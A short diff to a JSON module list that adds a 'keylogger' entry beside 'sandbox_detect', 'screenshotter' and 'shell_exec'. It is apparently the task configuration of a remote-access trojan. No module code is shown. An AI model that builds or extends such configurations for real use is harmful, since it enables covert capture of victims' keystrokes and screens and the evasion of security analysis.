@@ -5,6 +5,7 @@
     {
         "module" : "environment"
     },
+    {"module": "keylogger"},
     {"module":"sandbox_detect"},
     {"module": "screenshotter"},
     {"module":"shell_exec"}
